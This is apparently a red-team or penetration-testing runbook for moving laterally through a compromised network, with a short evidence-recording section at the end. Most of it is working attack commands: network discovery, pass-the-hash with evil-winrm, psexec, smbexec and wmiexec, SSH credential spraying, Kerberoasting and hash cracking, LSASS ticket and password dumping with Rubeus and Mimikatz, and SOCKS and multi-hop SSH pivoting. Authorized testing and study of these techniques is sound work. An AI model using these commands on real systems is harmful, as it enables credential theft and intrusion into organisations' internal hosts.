# Runbook: Network lateral movement

## Objective

Move from the initial foothold to higher-value targets inside the network, using network-level techniques to reach systems that cannot be accessed directly from outside.

## Phase 1: Establish the network picture

From the initial foothold, map the surrounding network:

```bash
# What networks can this host reach?
ip route
netstat -rn

# What hosts are on each reachable segment?
for subnet in 192.168.1.0/24 10.0.0.0/24; do
  nmap -sn $subnet -oG - | grep Up | awk '{print $2}'
done

# What services are running on interesting hosts?
nmap -sT -Pn -p 22,80,135,139,443,445,3389,5985,5986 <host-list>
```

Map trust relationships: which domain controllers are reachable, whether LSASS contains credential material for other systems, and which services are configured with domain accounts.

## Phase 2: Credential-based movement

With compromised domain credentials or hashes, move to reachable Windows hosts:

```bash
# WinRM (PowerShell Remoting)
evil-winrm -i <target-IP> -u administrator -H <NTLM-hash>

# SMB with pass-the-hash
smbexec.py -hashes :<NTLM-hash> domain/administrator@<target-IP>
psexec.py -hashes :<NTLM-hash> domain/administrator@<target-IP>

# WMI execution
wmiexec.py -hashes :<NTLM-hash> domain/administrator@<target-IP>
```

For Linux targets with SSH keys or reused passwords:

```bash
ssh -i stolen_key user@<target-IP>
# Test reused credentials against all SSH-accessible hosts
crackmapexec ssh <ip-range> -u user -p password
```

## Phase 3: Kerberoasting for lateral movement

From any domain user session, extract service tickets for offline cracking:

```bash
GetUserSPNs.py domain/user:password -dc-ip <DC-IP> -request -outputfile kerberoast-hashes.txt
hashcat -m 13100 kerberoast-hashes.txt /usr/share/wordlists/rockyou.txt
```

If service accounts have local admin rights on other hosts (visible in BloodHound), cracked service account credentials provide direct lateral movement.

## Phase 4: Token and ticket abuse

From a Windows session, harvest tickets and tokens:

```bash
# Dump tickets from LSASS with Rubeus
.\Rubeus.exe dump /nowrap

# Import a ticket for pass-the-ticket
.\Rubeus.exe ptt /ticket:<base64-ticket>

# Harvest credentials from LSASS with Mimikatz
privilege::debug
sekurlsa::logonpasswords
```

Tickets and hashes from LSASS provide direct access to any service the harvested accounts can reach, without needing to crack passwords.

## Phase 5: Pivoting through SOCKS

When the target cannot be reached directly, route through a compromised intermediate host:

```bash
# On the attacker machine, start a SOCKS proxy through the foothold
ssh -D 9050 -N user@foothold-host

# Use proxychains to route tools through the pivot
proxychains evil-winrm -i <internal-target-IP> -u administrator -H <hash>
proxychains smbexec.py -hashes :<hash> domain/admin@<internal-target-IP>
```

For multi-hop pivoting (reaching a third segment through the second):

```bash
# SSH port forward from foothold to second pivot
ssh -L 8022:<second-pivot>:22 user@foothold-host -N

# SOCKS through the second pivot
ssh -D 9051 -p 8022 user@localhost -N
```

## Evidence collection

Record: each host accessed, the credential or technique used, commands executed, data accessed, and the network path taken. Include a diagram or list of the pivot chain from initial foothold to each reached host.
